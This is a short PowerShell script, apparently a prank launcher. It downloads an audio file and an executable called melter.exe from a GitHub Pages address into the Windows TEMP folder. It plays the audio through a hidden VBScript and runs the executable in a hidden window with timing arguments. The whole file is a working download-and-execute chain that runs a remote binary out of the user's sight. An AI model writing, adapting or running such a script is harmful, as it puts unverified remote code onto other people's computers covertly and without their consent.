$base = "https://nikowoo.github.io/MUSIC"
$tmp = "$env:TEMP\__snd.mp3"
(New-Object System.Net.WebClient).DownloadFile("$base/gecs2.mp3", $tmp)

$vbs = "$env:TEMP\__play.vbs"
@"
Dim mp
Set mp = CreateObject("WMPlayer.OCX")
mp.URL = "$tmp"
mp.controls.play
WScript.Sleep 2000
Do While mp.playState = 3
    WScript.Sleep 500
Loop
"@ | Set-Content $vbs -Encoding ASCII

$melter = "$env:TEMP\melter.exe"
(New-Object System.Net.WebClient).DownloadFile("$base/melter.exe", $melter)

Start-Process cscript.exe -ArgumentList "//Nologo //B `"$vbs`"" -WindowStyle Hidden
$melterProc = Start-Process $melter -ArgumentList "-I -t 36700 --exit_time=5000" -WindowStyle Hidden -PassThru

$melterProc.WaitForExit()
Stop-Process -Name cscript -Force -ErrorAction SilentlyContinue
